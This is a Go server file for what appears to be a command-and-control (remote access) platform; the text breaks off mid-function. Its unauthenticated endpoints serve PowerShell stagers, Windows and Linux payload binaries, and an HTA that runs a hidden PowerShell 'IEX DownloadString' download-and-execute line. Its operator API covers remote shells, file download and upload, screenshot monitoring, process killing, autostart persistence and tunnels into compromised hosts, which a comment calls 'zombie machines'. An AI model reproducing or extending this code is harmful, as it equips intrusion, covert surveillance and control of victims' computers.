package server

import (
	"encoding/base64"
	"fmt"
	htmltemplate "html/template"
	"io/fs"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"gorm.io/gorm"

	"c2/webdist"

	"c2/internal/agent"
	"c2/internal/auth"
	"c2/internal/channels"
	"c2/internal/command"
	"c2/internal/config"
	"c2/internal/heartbeat"
	"c2/internal/listener"
	"c2/internal/middleware"
	"c2/internal/models"
	"c2/internal/payload"
	"c2/internal/screenshot"
	"c2/internal/script"
	"c2/internal/tunnel"
	"c2/internal/websocket"
)

type Server struct {
	cfg           *config.Config
	db            *gorm.DB
	engine        *gin.Engine
	lManager      *listener.Manager
	wsHub         *websocket.Hub
	cmdMgr        *command.Manager
	hbMonitor     *heartbeat.Monitor
	payloadGen    *payload.Generator
	scriptGen     *script.Generator
	screenshotMgr *screenshot.Manager
	tunnelMgr     *tunnel.Manager
	chHub         *channels.Hub
}

func New(cfg *config.Config, db *gorm.DB) *Server {
	gin.SetMode(gin.ReleaseMode)
	r := gin.New()
	r.Use(gin.Recovery())

	s := &Server{
		cfg:           cfg,
		db:            db,
		engine:        r,
		payloadGen:    payload.NewGenerator(),
		scriptGen:     script.NewGenerator(),
		screenshotMgr: screenshot.NewManager(db),
		tunnelMgr:     tunnel.NewManager(db),
	}

	s.wsHub = websocket.NewHub(db, cfg.Auth.JWTSecret)
	go s.wsHub.Run()

	s.cmdMgr = command.NewManager(db)
	s.chHub = channels.NewHub(db, s.cmdMgr, s.wsHub)

	s.hbMonitor = heartbeat.NewMonitor(db)
	s.hbMonitor.Start()

	s.lManager = listener.NewManager(db, s.handleNewConnection)

	s.registerRoutes()
	return s
}

// htmlAuthMiddleware：Cookie 无效则重定向 /login
func (s *Server) htmlAuthMiddleware() gin.HandlerFunc {
	return func(c *gin.Context) {
		token, err := c.Cookie("c2_token")
		if err != nil || token == "" {
			c.Redirect(http.StatusFound, "/login")
			c.Abort()
			return
		}
		if _, err := auth.ParseToken(s.cfg.Auth.JWTSecret, token); err != nil {
			c.Redirect(http.StatusFound, "/login")
			c.Abort()
			return
		}
		c.Next()
	}
}

// handleRoot：根路径重定向登录页
func (s *Server) handleRoot(c *gin.Context) {
	c.Redirect(http.StatusFound, "/login")
}

func (s *Server) registerRoutes() {
	tplFS, err := fs.Sub(webdist.FS, "templates")
	if err != nil {
		log.Fatalf("webdist templates: %v", err)
	}
	staticFS, err := fs.Sub(webdist.FS, "static")
	if err != nil {
		log.Fatalf("webdist static: %v", err)
	}
	templ := htmltemplate.Must(htmltemplate.New("").Delims("{{", "}}").Funcs(s.engine.FuncMap).ParseFS(tplFS, "*.html"))
	s.engine.SetHTMLTemplate(templ)
	s.engine.StaticFS("/static", http.FS(staticFS))

	s.engine.GET("/healthz", func(c *gin.Context) {
		c.JSON(200, gin.H{"status": "ok"})
	})

	// 无需认证的 stager / payload 接口，供“连接指令”一条命令上线使用
	// Windows PowerShell stager: http://SERVER/payload/ps1/{id}
	s.engine.GET("/payload/ps1/:id", s.handleWindowsPayloadStager)
	// Windows payload exe: 由 stager 反射加载 http://SERVER/payload_exe/{id}
	s.engine.GET("/payload_exe/:id", s.handleWindowsPayloadExe)
	// Linux ELF：/payload/{id}.elf；MSHTA：/payload/{id}.hta（内嵌拉取 /payload/ps1/{id}）
	s.engine.GET("/payload/:listener_elf", s.handleLinuxPayloadELF)

	// Agent 与平台之间的业务通道（WebSocket）；需先经 TCP Signal 拉活
	s.engine.GET("/ws/agent", s.chHub.HandleAgentWS)

	s.engine.GET("/", s.handleRoot)
	s.engine.GET("/login", s.handleLoginPage)
	s.engine.POST("/api/login", s.handleLogin)

	// 需 JWT（或 Cookie）的页面与 API
	protected := s.engine.Group("/")
	protected.Use(s.htmlAuthMiddleware())
	{
		protected.GET("/dashboard", s.handleDashboardPage)
		protected.GET("/listeners", s.handleListenersPage)
		protected.GET("/clients", s.handleClientsPage)
		protected.GET("/client/:id", s.handleClientDetailPage)
		protected.GET("/terminal/:id", s.handleTerminalPage)
		protected.GET("/files/:id", s.handleFilesPage)
		protected.GET("/files/:id/ops", s.handleFilesOpsPage)
		protected.GET("/payloads", s.handlePayloadsPage)
		protected.GET("/tunnel/:id", s.handleTunnelPage)
	}

	// WebSocket
	s.engine.GET("/ws", s.wsHub.HandleWebSocket)

	api := s.engine.Group("/api")
	api.Use(s.jwtMiddleware())
	api.Use(middleware.LocalStringUTF8())
	{
		api.GET("/dashboard/summary", s.handleDashboardSummary)

		api.GET("/listeners", s.handleListListeners)
		api.POST("/listeners", s.handleCreateListener)
		api.PUT("/listeners/:id", s.handleUpdateListener)
		api.DELETE("/listeners/:id", s.handleDeleteListener)
		api.POST("/listeners/:id/start", s.handleStartListener)
		api.POST("/listeners/:id/stop", s.handleStopListener)
		api.GET("/listeners/:id/scripts", s.handleGetListenerScripts)

		api.GET("/clients", s.handleListClients)
		api.GET("/clients/:id", s.handleGetClient)
		api.PATCH("/clients/:id", s.handleUpdateClient)
		api.DELETE("/clients/:id", s.handleDeleteClient)

		api.POST("/clients/:id/command", s.handleExecuteCommand)
		api.GET("/clients/:id/commands", s.handleGetClientCommands)
		api.GET("/commands/:cmd_id/result", s.handleGetCommandResult)

		api.POST("/clients/:id/files/list", s.handleListFiles)
		api.POST("/clients/:id/files/tree", s.handleListFileTree)
		api.POST("/clients/:id/files/download", s.handleDownloadFile)
		api.POST("/clients/:id/files/upload", s.handleUploadFile)
		api.POST("/clients/:id/files/mkdir", s.handleMkdir)
		api.POST("/clients/:id/files/delete", s.handleDeleteFile)

		api.GET("/clients/:id/processes", s.handleListProcesses)
		api.POST("/clients/:id/processes/kill", s.handleKillProcess)

		api.POST("/clients/:id/screenshot", s.handleTakeScreenshot)
		api.GET("/clients/:id/screenshots", s.handleGetScreenshots)
		api.GET("/screenshots/:id", s.handleGetScreenshot)
		api.GET("/screenshots/latest/:id", s.handleGetLatestScreenshot)
		api.POST("/clients/:id/monitor/start", s.handleStartMonitor)
		api.POST("/clients/:id/monitor/stop", s.handleStopMonitor)

		api.POST("/clients/:id/autostart", s.handleSetAutoStart)
		api.DELETE("/clients/:id/autostart", s.handleRemoveAutoStart)

		api.GET("/clients/:id/tunnels", s.handleListTunnels)
		api.POST("/clients/:id/tunnels", s.handleCreateTunnel)
		api.POST("/tunnels/:id/start", s.handleStartTunnel)
		api.POST("/tunnels/:id/stop", s.handleStopTunnel)
		api.DELETE("/tunnels/:id", s.handleDeleteTunnel)

		api.GET("/payloads/formats", s.handleGetPayloadFormats)
		api.POST("/payloads/generate", s.handleGeneratePayload)
		api.GET("/payloads/download", s.handleDownloadPayload)
		api.GET("/payloads/download/:filename", s.handleDownloadPayload)

		api.POST("/clients/:id/session", s.handleCreateSession)
		api.DELETE("/sessions/:id", s.handleCloseSession)
		api.POST("/sessions/:id/input", s.handleSessionInput)
	}
}

func (s *Server) handleLoginPage(c *gin.Context) {
	c.HTML(http.StatusOK, "login.html", gin.H{})
}

func (s *Server) handleDashboardPage(c *gin.Context) {
	c.HTML(http.StatusOK, "dashboard.html", gin.H{})
}

func (s *Server) handleListenersPage(c *gin.Context) {
	c.HTML(http.StatusOK, "listeners.html", gin.H{})
}

func (s *Server) handleClientsPage(c *gin.Context) {
	c.HTML(http.StatusOK, "clients.html", gin.H{})
}

func (s *Server) handleClientDetailPage(c *gin.Context) {
	c.HTML(http.StatusOK, "client_detail.html", gin.H{
		"ClientID": c.Param("id"),
	})
}

func (s *Server) handleTerminalPage(c *gin.Context) {
	c.HTML(http.StatusOK, "terminal.html", gin.H{
		"ClientID": c.Param("id"),
	})
}

func (s *Server) handleFilesPage(c *gin.Context) {
	idStr := c.Param("id")
	var cl models.Client
	agentWD := ""
	treeLabel := "客户端 #" + idStr
	if err := s.db.First(&cl, idStr).Error; err == nil {
		agentWD = cl.WorkingDirectory
		switch {
		case cl.ExternalIP != "":
			treeLabel = fmt.Sprintf("%d: %s", cl.ID, cl.ExternalIP)
		case cl.InternalIP != "":
			treeLabel = fmt.Sprintf("%d: %s", cl.ID, cl.InternalIP)
		default:
			treeLabel = fmt.Sprintf("%d", cl.ID)
		}
	}
	c.HTML(http.StatusOK, "files.html", gin.H{
		"ClientID":         idStr,
		"ClientTreeLabel":  treeLabel,
		"AgentWorkingDir": agentWD,
	})
}

func (s *Server) handleFilesOpsPage(c *gin.Context) {
	c.HTML(http.StatusOK, "files_ops.html", gin.H{
		"ClientID": c.Param("id"),
		"Path":     c.Query("path"),
		"Action":   c.Query("action"),
	})
}

func (s *Server) handlePayloadsPage(c *gin.Context) {
	c.HTML(http.StatusOK, "payloads.html", gin.H{})
}

// handleWindowsPayloadStager 返回针对某个监听器的 PowerShell stager（无需认证）
// 用于一条命令下载并执行当前配置下的 payload 客户端。
func (s *Server) handleWindowsPayloadStager(c *gin.Context) {
	idStr := c.Param("id")
	var listenerID uint
	if _, err := fmt.Sscanf(idStr, "%d", &listenerID); err != nil {
		c.String(http.StatusBadRequest, "invalid listener id")
		return
	}

	var l models.Listener
	if err := s.db.First(&l, listenerID).Error; err != nil {
		if err == gorm.ErrRecordNotFound {
			c.String(http.StatusNotFound, "listener not found")
			return
		}
		c.String(http.StatusInternalServerError, "failed to query listener")
		return
	}

	// 使用当前请求的 Host 作为 HTTP 服务地址（例如 127.0.0.1:8080），
	// payload 内部再使用监听的 ExternalAddr 进行真正的 C2 回连。
	httpServerAddr := s.effectiveScriptServerHost(c)

	// 使用与监听器一致的安全参数生成 PowerShell stager
	cfg := &script.ScriptConfig{
		ServerAddr: httpServerAddr,
		VKey:       l.VKey,
		Salt:       l.Salt,
		ListenerID: l.ID,
		Mode:       l.Mode,
	}

	ps := s.scriptGen.GeneratePowerShell(cfg)
	c.Header("Content-Type", "text/plain; charset=utf-8")
	c.String(http.StatusOK, ps)
}

// handleWindowsPayloadExe 为指定监听器生成（或复用）Windows exe payload，供 PowerShell stager 下载并反射执行。
func (s *Server) handleWindowsPayloadExe(c *gin.Context) {
	idStr := c.Param("id")
	var listenerID uint
	if _, err := fmt.Sscanf(idStr, "%d", &listenerID); err != nil {
		c.String(http.StatusBadRequest, "invalid listener id")
		return
	}

	var l models.Listener
	if err := s.db.First(&l, listenerID).Error; err != nil {
		if err == gorm.ErrRecordNotFound {
			c.String(http.StatusNotFound, "listener not found")
			return
		}
		c.String(http.StatusInternalServerError, "failed to query listener")
		return
	}

	// 优先复用已生成的 payload_EXE，避免每次请求都重新编译。
	// 命名格式：payload_{listenerID}_windows_x64_*.exe
	prefix := fmt.Sprintf("payload_%d_windows_x64_", l.ID)
	payloadDir := payload.RelPathGenerated

	var latestFile string
	var latestMod time.Time
	entries, _ := os.ReadDir(payloadDir)
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		name := e.Name()
		if filepath.Ext(name) != ".exe" {
			continue
		}
		if !strings.HasPrefix(name, prefix) {
			continue
		}
		info, err := e.Info()
		if err != nil {
			continue
		}
		if info.ModTime().After(latestMod) {
			latestMod = info.ModTime()
			latestFile = name
		}
	}

	// 如果没有找到现成的 exe，则按当前监听配置生成一份新的
	if latestFile == "" {
		cfg := &payload.Config{
			ListenerID:   l.ID,
			Mode:         l.Mode,
			ServerAddr:   l.ExternalAddr,
			ExternalAddr: l.ExternalAddr,
			ListenAddr:   l.ListenAddr,
			VKey:         l.VKey,
			Salt:         l.Salt,
			OS:           "windows_x64",
			Arch:         "amd64",
			Format:       "bin",
			Obfuscate:    false,
		}
		cfg.WebHost, cfg.WebPort = s.webHostPortForPayload(c)

		filename, err := s.payloadGen.Generate(cfg)
		if err != nil {
			c.String(http.StatusInternalServerError, fmt.Sprintf("failed to generate payload: %v", err))
			return
		}
		latestFile = filename
	}

	filePath := filepath.Join(payloadDir, latestFile)
	c.Header("Content-Type", "application/octet-stream")
	c.File(filePath)
}

// handleLinuxPayloadELF 下载或按需生成 Linux amd64 ELF（payload_{id}_linux_amd64_*.elf）
func (s *Server) handleLinuxPayloadELF(c *gin.Context) {
	p := c.Param("listener_elf")
	if strings.HasSuffix(p, ".hta") {
		s.handleWindowsPayloadHTA(c)
		return
	}
	if !strings.HasSuffix(p, ".elf") {
		c.String(http.StatusBadRequest, "expected /payload/{listener_id}.elf or .hta")
		return
	}
	idStr := strings.TrimSuffix(p, ".elf")
	var listenerID uint
	if _, err := fmt.Sscanf(idStr, "%d", &listenerID); err != nil {
		c.String(http.StatusBadRequest, "invalid listener id")
		return
	}

	var l models.Listener
	if err := s.db.First(&l, listenerID).Error; err != nil {
		if err == gorm.ErrRecordNotFound {
			c.String(http.StatusNotFound, "listener not found")
			return
		}
		c.String(http.StatusInternalServerError, "failed to query listener")
		return
	}

	prefix := fmt.Sprintf("payload_%d_linux_amd64_", l.ID)
	payloadDir := payload.RelPathGenerated

	var latestFile string
	var latestMod time.Time
	entries, _ := os.ReadDir(payloadDir)
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		name := e.Name()
		if filepath.Ext(name) != ".elf" {
			continue
		}
		if !strings.HasPrefix(name, prefix) {
			continue
		}
		info, err := e.Info()
		if err != nil {
			continue
		}
		if info.ModTime().After(latestMod) {
			latestMod = info.ModTime()
			latestFile = name
		}
	}

	if latestFile == "" {
		cfg := &payload.Config{
			ListenerID:   l.ID,
			Mode:         l.Mode,
			ServerAddr:   l.ExternalAddr,
			ExternalAddr: l.ExternalAddr,
			ListenAddr:   l.ListenAddr,
			VKey:         l.VKey,
			Salt:         l.Salt,
			OS:           "linux_amd64",
			Arch:         "amd64",
			Format:       "bin",
			Obfuscate:    false,
		}
		cfg.WebHost, cfg.WebPort = s.webHostPortForPayload(c)

		filename, err := s.payloadGen.Generate(cfg)
		if err != nil {
			c.String(http.StatusInternalServerError, fmt.Sprintf("failed to generate linux payload: %v", err))
			return
		}
		latestFile = filename
	}

	filePath := filepath.Join(payloadDir, latestFile)
	c.Header("Content-Type", "application/octet-stream")
	c.File(filePath)
}

// handleWindowsPayloadHTA 返回 HTA，内嵌调用与 /payload/ps1 相同的 PowerShell 一行下载逻辑（供 mshta 使用）。
func (s *Server) handleWindowsPayloadHTA(c *gin.Context) {
	p := c.Param("listener_elf")
	if !strings.HasSuffix(p, ".hta") {
		c.String(http.StatusBadRequest, "expected /payload/{listener_id}.hta")
		return
	}
	idStr := strings.TrimSuffix(p, ".hta")
	var listenerID uint
	if _, err := fmt.Sscanf(idStr, "%d", &listenerID); err != nil {
		c.String(http.StatusBadRequest, "invalid listener id")
		return
	}
	var l models.Listener
	if err := s.db.First(&l, listenerID).Error; err != nil {
		if err == gorm.ErrRecordNotFound {
			c.String(http.StatusNotFound, "listener not found")
			return
		}
		c.String(http.StatusInternalServerError, "failed to query listener")
		return
	}

	base := "http://" + s.effectiveScriptServerHost(c)
	url := fmt.Sprintf("%s/payload/ps1/%d", base, listenerID)
	// VBScript：双引号写成 ""；URL 放在 PowerShell 的单引号字符串中
	html := fmt.Sprintf(`<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<HTA:APPLICATION ID="r" APPLICATIONNAME=" " BORDER="none" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SINGLEINSTANCE="yes"/>
<script language="VBScript">
Sub Window_OnLoad
  Dim sh, cmd, u
  u = "%s"
  Set sh = CreateObject("WScript.Shell")
  cmd = "powershell.exe -nop -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('" & u & "')"""
  sh.Run cmd, 0, False
  window.Close
End Sub
</script>
</head>
<body></body>
</html>`, url)

	c.Header("Content-Type", "application/hta; charset=utf-8")
	c.String(http.StatusOK, html)
}

func (s *Server) handleTunnelPage(c *gin.Context) {
	c.HTML(http.StatusOK, "tunnel.html", gin.H{
		"ClientID": c.Param("id"),
	})
}

func (s *Server) Run() error {
	addr := s.cfg.Server.Addr
	if addr == "" {
		addr = ":8080"
	}
	return s.engine.Run(addr)
}

type loginRequest struct {
	Username string `json:"username" binding:"required"`
	Password string `json:"password" binding:"required"`
}

func (s *Server) handleLogin(c *gin.Context) {
	var req loginRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
		return
	}

	if req.Username != "admin" || req.Password != s.cfg.Auth.LoginPassword {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "invalid credentials"})
		return
	}

	token, err := auth.GenerateToken(s.cfg.Auth.JWTSecret, "admin", 24*time.Hour)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to generate token"})
		return
	}

	// 同步写入 Cookie，便于浏览器打开 HTML 页时免带 Authorization
	c.SetCookie("c2_token", token, int((24 * time.Hour).Seconds()), "/", "", false, false)

	c.JSON(http.StatusOK, gin.H{"token": token})
}

func (s *Server) jwtMiddleware() gin.HandlerFunc {
	return func(c *gin.Context) {
		authHeader := c.GetHeader("Authorization")
		var tokenStr string

		if authHeader != "" {
			const prefix = "Bearer "
			if len(authHeader) <= len(prefix) || authHeader[:len(prefix)] != prefix {
				c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{"error": "invalid Authorization header"})
				return
			}
			tokenStr = authHeader[len(prefix):]
		} else {
			// 回退：从 Cookie 读取 JWT
			if cookieToken, err := c.Cookie("c2_token"); err == nil {
				tokenStr = cookieToken
			} else {
				c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{"error": "missing token"})
				return
			}
		}

		claims, err := auth.ParseToken(s.cfg.Auth.JWTSecret, tokenStr)
		if err != nil {
			c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{"error": "invalid token"})
			return
		}

		c.Set("user", claims.Username)
		c.Next()
	}
}

func (s *Server) handleDashboardSummary(c *gin.Context) {
	metrics := collectSystemMetrics()

	var listenersTotal int64
	var listenersOnline int64
	var clientsTotal int64
	var clientsOnline int64
	var clientsHistorical int64

	s.db.Model(&models.Listener{}).Count(&listenersTotal)
	s.db.Model(&models.Listener{}).Where("status = ?", "online").Count(&listenersOnline)
	s.db.Model(&models.Client{}).Where("is_manually_deleted = ?", false).Count(&clientsTotal)
	s.db.Model(&models.Client{}).Where("status = ? AND is_manually_deleted = ?", "online", false).Count(&clientsOnline)
	s.db.Model(&models.Client{}).Count(&clientsHistorical)

	var recentCommands []models.CommandLog
	s.db.Order("created_at desc").Limit(10).Find(&recentCommands)

	c.JSON(http.StatusOK, gin.H{
		"listeners_total":        listenersTotal,
		"listeners_online":       listenersOnline,
		"clients_total":          clientsTotal,
		"clients_online":         clientsOnline,
		"clients_historical":     clientsHistorical,
		"cpu_usage_percent":      metrics.CPUUsagePercent,
		"disk_usage_percent":     metrics.DiskUsagePercent,
		"memory_usage_percent":   metrics.MemoryUsagePercent,
		"swap_usage_percent":     metrics.SwapUsagePercent,
		"server_os":              metrics.GOOS,
		"swap_metric_label":      metrics.SwapLabel,
		"disk_metric_label":      metrics.DiskLabel,
		"tcp_established":        metrics.TCPEstablished,
		"udp_sockets":            metrics.UDPCount,
		"net_out_bps":            metrics.NetOutBps,
		"net_in_bps":             metrics.NetInBps,
		"web_port":               s.webListenPort(),
		"log_files":              "7",
		"license_expire":         "20991201",
		"auth_type":              "高级授权Basic认证",
		"dashboard_version":      "1.0",
		"licensed_client_count":  99,
		"recent_commands":        recentCommands,
		"message":                "ok",
		"server_time_unix_milli": time.Now().UnixMilli(),
	})
}

type listenerRequest struct {
	Remark                string `json:"remark"`
	Mode                  string `json:"mode"`
	ListenAddr            string `json:"listen_addr" binding:"required"`
	ExternalAddr          string `json:"external_addr" binding:"required"`
	HeartbeatTimeoutCount int    `json:"heartbeat_timeout_count"`
	HeartbeatIntervalSec  int    `json:"heartbeat_interval_sec"`
	VKey                  string `json:"vkey"`
	Salt                  string `json:"salt"`
}

func (s *Server) handleListListeners(c *gin.Context) {
	var listeners []models.Listener
	if err := s.db.Order("id desc").Find(&listeners).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to query listeners"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"items": listeners})
}

func (s *Server) handleCreateListener(c *gin.Context) {
	var req listenerRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
		return
	}

	mode := req.Mode
	if mode == "" {
		mode = "tcp"
	}

	l := &models.Listener{
		Remark:                req.Remark,
		Mode:                  mode,
		ListenAddr:            req.ListenAddr,
		ExternalAddr:          req.ExternalAddr,
		HeartbeatTimeoutCount: req.HeartbeatTimeoutCount,
		HeartbeatIntervalSec:  req.HeartbeatIntervalSec,
		VKey:                  req.VKey,
		Salt:                  req.Salt,
		Status:                "offline",
	}

	if l.HeartbeatTimeoutCount == 0 {
		l.HeartbeatTimeoutCount = 3
	}
	if l.HeartbeatIntervalSec == 0 {
		l.HeartbeatIntervalSec = 30
	}

	if err := s.db.Create(l).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create listener"})
		return
	}

	c.JSON(http.StatusOK, l)
}

func (s *Server) handleUpdateListener(c *gin.Context) {
	id := c.Param("id")
	var existing models.Listener
	if err := s.db.First(&existing, id).Error; err != nil {
		if err == gorm.ErrRecordNotFound {
			c.JSON(http.StatusNotFound, gin.H{"error": "listener not found"})
			return
		}
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to query listener"})
		return
	}

	var req listenerRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
		return
	}

	if req.Remark != "" {
		existing.Remark = req.Remark
	}
	if req.Mode != "" {
		existing.Mode = req.Mode
	}
	if req.ListenAddr != "" {
		existing.ListenAddr = req.ListenAddr
	}
	if req.ExternalAddr != "" {
		existing.ExternalAddr = req.ExternalAddr
	}
	if req.HeartbeatTimeoutCount != 0 {
		existing.HeartbeatTimeoutCount = req.HeartbeatTimeoutCount
	}
	if req.HeartbeatIntervalSec != 0 {
		existing.HeartbeatIntervalSec = req.HeartbeatIntervalSec
	}
	if req.VKey != "" {
		existing.VKey = req.VKey
	}
	if req.Salt != "" {
		existing.Salt = req.Salt
	}

	if err := s.db.Save(&existing).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to update listener"})
		return
	}

	c.JSON(http.StatusOK, existing)
}

func (s *Server) handleDeleteListener(c *gin.Context) {
	id := c.Param("id")

	var numericID uint
	if _, err := fmt.Sscanf(id, "%d", &numericID); err == nil {
		s.lManager.StopListener(numericID)
	}

	if err := s.db.Delete(&models.Listener{}, id).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to delete listener"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"deleted": true})
}

func (s *Server) handleStartListener(c *gin.Context) {
	id := c.Param("id")
	var l models.Listener
	if err := s.db.First(&l, id).Error; err != nil {
		if err == gorm.ErrRecordNotFound {
			c.JSON(http.StatusNotFound, gin.H{"error": "listener not found"})
			return
		}
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to query listener"})
		return
	}

	if l.Mode != "tcp" && l.Mode != "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "only tcp mode supported now"})
		return
	}

	if err := s.lManager.StartListener(&l); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("failed to start listener: %v", err)})
		return
	}
	c.JSON(http.StatusOK, gin.H{"started": true})
}

func (s *Server) handleStopListener(c *gin.Context) {
	id := c.Param("id")
	var numericID uint
	if _, err := fmt.Sscanf(id, "%d", &numericID); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid id"})
		return
	}
	s.lManager.StopListener(numericID)
	c.JSON(http.StatusOK, gin.H{"stopped": true})
}

func (s *Server) handleGetListenerScripts(c *gin.Context) {
	idStr := c.Param("id")
	var numericID uint
	if _, err := fmt.Sscanf(idStr, "%d", &numericID); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid id"})
		return
	}
	var l models.Listener
	if err := s.db.First(&l, numericID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "listener not found"})
		return
	}

	// 脚本中的 SERVER 地址应指向 Web 服务本身；配置了 public_host 时给远端可访问的地址。
	httpServerAddr := s.effectiveScriptServerHost(c)

	cfg := &script.ScriptConfig{
		ServerAddr: httpServerAddr,
		VKey:       l.VKey,
		Salt:       l.Salt,
		ListenerID: l.ID,
		Mode:       l.Mode,
	}

	scripts := s.scriptGen.GenerateAllScripts(cfg)
	c.JSON(http.StatusOK, gin.H{"scripts": scripts})
}

func (s *Server) handleListClients(c *gin.Context) {
	showDeleted := c.Query("show_deleted") == "true"

	var clients []models.Client
	query := s.db.Order("id desc")
	if !showDeleted {
		query = query.Where("is_manually_deleted = ?", false)
	}
	if err := query.Find(&clients).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to query clients"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"items": clients})
}

func (s *Server) handleGetClient(c *gin.Context) {
	id := c.Param("id")
	var client models.Client
	if err := s.db.First(&client, id).Error; err != nil {
		if err == gorm.ErrRecordNotFound {
			c.JSON(http.StatusNotFound, gin.H{"error": "client not found"})
			return
		}
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to query client"})
		return
	}
	c.JSON(http.StatusOK, client)
}

type updateClientRequest struct {
	Remark string `json:"remark"`
	Status string `json:"status"`
}

func (s *Server) handleUpdateClient(c *gin.Context) {
	id := c.Param("id")
	var client models.Client
	if err := s.db.First(&client, id).Error; err != nil {
		if err == gorm.ErrRecordNotFound {
			c.JSON(http.StatusNotFound, gin.H{"error": "client not found"})
			return
		}
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to query client"})
		return
	}

	var req updateClientRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
		return
	}

	if req.Remark != "" {
		client.Remark = req.Remark
	}
	if req.Status != "" {
		client.Status = req.Status
	}

	if err := s.db.Save(&client).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to update client"})
		return
	}
	c.JSON(http.StatusOK, client)
}

func (s *Server) handleDeleteClient(c *gin.Context) {
	id := c.Param("id")

	var clientID uint
	if _, err := fmt.Sscanf(id, "%d", &clientID); err == nil {
		s.chHub.CloseAgent(clientID)
		agent.GetConnectionManager().SendDisconnect(clientID)
	}

	now := time.Now()
	if err := s.db.Model(&models.Client{}).Where("id = ?", id).Updates(map[string]interface{}{
		"deleted_at":          &now,
		"is_manually_deleted": true,
		"status":              "offline",
	}).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to delete client"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"deleted": true})
}

// httpHost 用于生成 Signal 中的 Web 地址（客户端据此连接 /ws/agent）。
func (s *Server) httpHost(c *gin.Context) string {
	if c != nil && c.Request.Host != "" {
		return c.Request.Host
	}
	a := s.cfg.Server.Addr
	if strings.HasPrefix(a, ":") {
		return "127.0.0.1" + a
	}
	return a
}

// webListenPort 从 server.addr 解析 HTTP/WS 监听端口（如 :8080 -> 8080）。
func (s *Server) webListenPort() string {
	a := strings.TrimSpace(s.cfg.Server.Addr)
	if a == "" {
		return "8080"
	}
	if strings.HasPrefix(a, ":") {
		return strings.TrimPrefix(a, ":")
	}
	_, p, err := net.SplitHostPort(a)
	if err != nil {
		return "8080"
	}
	return p
}

// effectiveScriptServerHost 用于「连接指令」与无认证 stager URL：远端肉鸡须能访问该 host:port。
// 若配置了 public_host，优先使用其 + 面板监听端口，避免管理员用 localhost 打开页面时生成错误地址。
func (s *Server) effectiveScriptServerHost(c *gin.Context) string {
	if ph := strings.TrimSpace(s.cfg.Server.PublicHost); ph != "" {
		return net.JoinHostPort(ph, s.webListenPort())
	}
	if c != nil && c.Request.Host != "" {
		return c.Request.Host
	}
	return s.httpHost(c)
}

// webHostPortForPayload 将 effectiveScriptServerHost 拆成嵌入载荷的 WebHost/WebPort。
func (s *Server) webHostPortForPayload(c *gin.Context) (string, int) {
	hp := s.effectiveScriptServerHost(c)
	h, pStr, err := net.SplitHostPort(hp)
	if err != nil {
		wp, _ := strconv.Atoi(s.webListenPort())
		if wp == 0 {
			wp = 8080
		}
		return strings.TrimSpace(hp), wp
	}
	wp, _ := strconv.Atoi(pStr)
	if wp == 0 {
		wp, _ = strconv.Atoi(s.webListenPort())
	}
	if wp == 0 {
		wp = 8080
	}
	return h, wp
}

// agentSignalHost 返回客户端应拨号的 "host:port"（用于 EnsureAgentWS / Signal）。
// 关键：不能用浏览器里的 127.0.0.1 发给远端 Agent，否则对方会连自己的本机。
func (s *Server) agentSignalHost(c *gin.Context, clientID uint) string {
	wp := s.webListenPort()
	if ph := strings.TrimSpace(s.cfg.Server.PublicHost); ph != "" {
		return net.JoinHostPort(ph, wp)
	}
	var cl models.Client
	if err := s.db.First(&cl, clientID).Error; err == nil && cl.AssociatedListenerID != nil {
		var lis models.Listener
		if err := s.db.First(&lis, *cl.AssociatedListenerID).Error; err == nil && lis.ExternalAddr != "" {
			if h, _, err := net.SplitHostPort(lis.ExternalAddr); err == nil && h != "" {
				if h != "0.0.0.0" && h != "::" && h != "[::]" {
					return net.JoinHostPort(h, wp)
				}
			}
		}
	}
	return s.httpHost(c)
}

// preferAgentWebSocketDispatch 为 true 时，在 Agent 已连 /ws/agent 时走 WebSocket 下发，
// command_response 由 channels hub 接收并完成命令；否则回退 TCP 控制连接（与客户端 reply_on_tcp 一致）。
func preferAgentWebSocketDispatch(cmdType string) bool {
	switch cmdType {
	case "shell_session_create", "shell_session_write", "shell_session_close":
		return true
	case command.CmdListDir, command.CmdListDirChildren,
		command.CmdDownload, command.CmdUpload, command.CmdMkdir,
